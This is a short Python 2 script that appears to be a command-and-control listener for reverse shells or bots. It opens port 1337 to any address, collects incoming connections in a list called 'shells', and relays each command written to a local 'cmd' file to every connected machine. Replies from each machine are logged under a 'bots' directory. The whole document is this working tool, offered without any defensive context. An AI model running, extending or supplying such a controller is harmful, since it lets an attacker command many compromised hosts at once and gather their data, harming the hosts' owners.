#!/usr/bin/env python

import datetime
import errno
import os
import socket
import sys

def mkdir_p(path):
	try:
		os.makedirs(path)
	except OSError as exc:
		if exc.errno == errno.EEXIST and os.path.isdir(path):
			pass
		else:
			raise

try:
	sconn=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sconn.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	saddr=('0.0.0.0',1337)
	print('starting up on port '+str(saddr))

	sconn.bind(saddr)
	sconn.listen(1)
	sconn.setblocking(0)

	shells=[]

	old_time=datetime.datetime.now()
	interval_sec=2

	while True:
		try:
			conn,caddr=sconn.accept()
			conn.setblocking(0)
			shells.append((conn,caddr))
			print('new '+str(caddr))
		except:
			pass

		cmd=''

		new_time=datetime.datetime.now()

		if (new_time-old_time).seconds>=interval_sec:
			old_time=new_time

			try:
				cmd_file=open('cmd','r')
				cmd=cmd_file.read()
				cmd_file.close()
				cmd_file=open('cmd','w')
				cmd_file.write('')
				cmd_file.close()
			except:
				pass

		for shell in shells:
			conn=shell[0]
			caddr=shell[1]

			try:
				if len(cmd)>0:
					conn.sendall(cmd)
					print('send '+str(caddr))

				try:
					data=conn.recv(1)

					if data:
						try:
							mkdir_p('bots')
							ostr=open("bots/"+str(caddr[0]+':'+str(caddr[1])),'a')
							ostr.write(data)
							ostr.close()
						except:
							pass
					else:
						raise(Exception("Killing..."))
				except socket.error,error:
					if error.args[0]==errno.EWOULDBLOCK or error.args[0]==errno.EAGAIN:
						continue
					else:
						raise
			except Exception as error:
				conn.close()
				shells.remove(shell)
				print('lost '+str(caddr))
except Exception as error:
	print(error)
	exit(1)
finally:
	exit(0)
